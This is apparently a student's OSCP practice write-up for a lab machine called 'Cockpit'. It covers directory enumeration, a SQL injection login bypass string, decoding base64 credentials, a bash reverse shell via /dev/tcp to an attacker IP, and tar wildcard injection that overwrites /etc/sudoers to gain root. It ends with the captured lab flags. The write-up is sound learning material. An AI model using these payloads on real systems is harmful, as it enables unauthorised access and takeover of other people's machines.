---
title: OSCP - Cockpit - Linux
created: 2026-01-26
updated: 2026-01-22
status: seed
draft: false
tags:
  - cyber-security
Related: "[[Cybersecurity]]"
---
# Cockpit
This one was originally listed as "Hard" in my list, but when I checked during startup it showed as "Intermediate". Definitely don't think it should be listed as "Intermediate" though - this was definitely the trickest boxes I've done, and I absolutely leaned heavily on the walkthrough to make progress here.

The biggest challenge ofcourse was the box breaking everytime I tried to run `gobuster` against it to find directories or files. Turned out there was a hidden `login.php` file on the port `80` server, but I couldn't find the damn thing with the first few gobuster scans because the whole box would break and require revert. Worse was finding the `blocked.html` page which would break the box every time I visited it OR scanned it with `gobuster`.

The biggest lesson out of this was quite unexpected though, and it was how to use `Seclists`! I'd known about `SecLists` for a fair while and assumed them were just an alternative set of user & password lists, but it turns out there's all sorts of tips on bypassing logins with SQLi, php plugins for reverse shells, and a mountain of other things I usually need to look up online. Not sure how much I'll use it going forward, but it's certainly an option when Google isn't providing the answers I need.

The privilege escalation was a tricky one too, although it was more about following the walkthrough and matching up what was in the GTFObin with what the walkthrough was showing. I understand it all in principle, but actually figuring out each every step on my own would have been a massive stretch - the walkthrough was vital here, and having now followed the process to get the privesc I'm optimistic I'll be able to adapt to a similar process if I find a similar GTFObin in the future.
# Resolution summary
- Ran Nmap to identify ports `22`, `80`& `9090`
- Ran `gobuster` against port `80` and identified `login.php`
- Identified `blaze` and used MySQLi bypass to access admin
- Identified base64 encoded credentials and decoded them with cyberchef
- Used decoded credentials to login to port `9090`
- Accessed terminal emulator inside admin panel and created reverse shell for initial access
- Checked sudo privileges and identified relevant GTFObin for `tar`
- Created `paylaod.sh` to abuse `sudo` privileges echo into `/etc/sudoers` with tar backup
- Created checkpoint and ran `sudo tar` command 
- Checked `sudo -l` to confirm new privileges, 
- Switched user to `root` and printed `proof.txt`
## Improved skills
- Using Seclists to find MySQL injections
- Using Cyberchef to ID hashes/encoding
## Used tools
- nmap
- gobuster
- Hashcat
- Cyberchef
- Seclists

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN Cockpit.nmap 192.168.244.10 -v
```

Enumerated open TCP ports:
```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
9090/tcp open  zeus-admin?
|_drda-info: TIMEOUT
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|     margin: 0 0 10px;
|_    @font-face {
1 service unrecognized despite returning data.
```
---
# Enumeration
## Port 22 - SSH (OpenSSH 8.2p1)
No enumeration conducted
## Port 80 - HTTP (Apache 2.4.41)
- Navigated to `http://192.168.244.10:80` and identified `Apache HTTP Server v 2.4.41`
![OSCP Cockpit Linux Image1](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image1.png)
- Ran `gobuster dir -u http://192.168.244.10 -w //usr/share/dirb/wordlists/big.txt -x php,html,txt` to identify available files - identified `blocked.html` before target machine crashed.
![OSCP Cockpit Linux Image2](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image2.png)
- Navigated to `http://192.168.244.10/blocked.html`
![OSCP Cockpit Linux Image3](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image3.png)
- Viewed source for `http://192.168.244.10/blocked.html` and found no further information
![OSCP Cockpit Linux Image4](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image4.png)
- Forced to revert machine second time because target had crashed again after accessing `blocked.html`
- Re-ran `gobuster` with more threads and 400/403/404 blacklisted:  `gobuster dir -u http://192.168.244.10 -w //usr/share/dirb/wordlists/big.txt -x php,html,txt -t 42 -b 404,403,400` - created many errors but identified `login.php`
![OSCP Cockpit Linux Image5](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image5.png)
- Navigated to `http://192.168.244.10/login.php` and identified `Blaze` login - attempted login with credentials `admin:admin`
![OSCP Cockpit Linux Image6](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image6.png)
- Checked `/usr/share/wordlists/seclists/Fuzzing/Databases` for potential login bypass suggestion - identified `MySQL-SQLi-Login-Bypass.fuzzdb.txt` and viewed it
![OSCP Cockpit Linux Image7](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image7.png)
- Attempted login to `http://192.168.244.10/login.php` with username `'OR '' = '` - gained access to `password-dashboard.php`  and identified encoded passwords
![OSCP Cockpit Linux Image8](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image8.png)
- Copied passwords into `CyberChef` and identified base64-encoded credentials `james:canttouchhhthiss@455152` & `cameron:thisscanttbetouchedd@455152`
![OSCP Cockpit Linux Image9](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image9.png)
![OSCP Cockpit Linux Image10](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image10.png)
## Port 9090 - zeus-admin
- Navigated to `http://192.168.244.10:9090` and received invalid security certificate warning
![OSCP Cockpit Linux Image11](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image11.png)
- Viewed Certificate and identified potential MD5 hash in `Organisation`
![OSCP Cockpit Linux Image12](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image12.png)
- Copied MD5 hash to `cert.hash` and ran `hashcat -m 0 cert.hash /usr/share/wordlists/rockyou.txt --force` - failed to find a match in `rockyou.txt`
![OSCP Cockpit Linux Image13](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image13.png)
- Proceeded to website and identified server login interface and `Ubuntu 20.04.6 LTS`
![OSCP Cockpit Linux Image14](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image14.png)
- Checked page source and identified script for "Cockpit" login
![OSCP Cockpit Linux Image15](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image15.png)
- Attempted password guessing with credentials `admin:admin`
![OSCP Cockpit Linux Image16](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image16.png)
- Attempted password guessing with credentials `admin:password`
![OSCP Cockpit Linux Image17](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image17.png)
- Attempted login with credentials `james:canttouchhhthiss@455152`
![OSCP Cockpit Linux Image18](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image18.png)
- Attempted login with credentials `cameron:thisscanttbetouchedd@455152`
![OSCP Cockpit Linux Image19](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image19.png)

---
# Exploitation
- Reattempted login with credentials `james:canttouchhhthiss@455152`
![OSCP Cockpit Linux Image20](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image20.png)
- Identified "Terminal" and achieved command execution on target - ran `cat local.txt` to print `fa9343d03bf9cbb2e6ae3c5af22043dc`
![OSCP Cockpit Linux Image21](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image21.png)
- Started netcat listener on port `4444` and ran `/bin/bash -i >& /dev/tcp/192.168.45.155/4444 0>&1` on target to establish reverse shell
![OSCP Cockpit Linux Image22](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image22.png)
![OSCP Cockpit Linux Image23](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image23.png)

---
# Privilege Escalation
## Local Enumeration
- Ran `sudo -l` and identified `james` can run `/usr/bin/tar -czvf /tmp/backup.tar.gz *` as root without a password
![OSCP Cockpit Linux Image24](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image24.png)
- Identified [GTFObin for `tar`](https://gtfobins.github.io/gtfobins/tar/) using `sudo`
![OSCP Cockpit Linux Image25](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image25.png)
## Privilege Escalation vector
- Navigated to `/tmp` and ran `touch payload.sh` to create `payload.sh` file, then ran following commands to add to `payload.sh` and setup backup using wildcard 
```
echo "echo 'james ALL=(root) NOPASSWD: ALL' > /etc/sudoers" > payload.sh
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh payload.sh'
```

![OSCP Cockpit Linux Image26](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image26.png)
- Ran command `sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *` 
![OSCP Cockpit Linux Image27](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image27.png)
- Ran `sudo -l` to check new sudo privileges for `james`, ran  `sudo /bin/bash` to become `root`, then ran `cat /root/proof.txt` to print `d8381218cb60a519ac20d2b75b8e1fec`
![OSCP Cockpit Linux Image28](/images/OSCP%20-%20Cockpit%20-%20Linux%20-%20image28.png)
---
# Trophy & Loot
`local.txt` = `fa9343d03bf9cbb2e6ae3c5af22043dc`
`root.txt` = `d8381218cb60a519ac20d2b75b8e1fec`

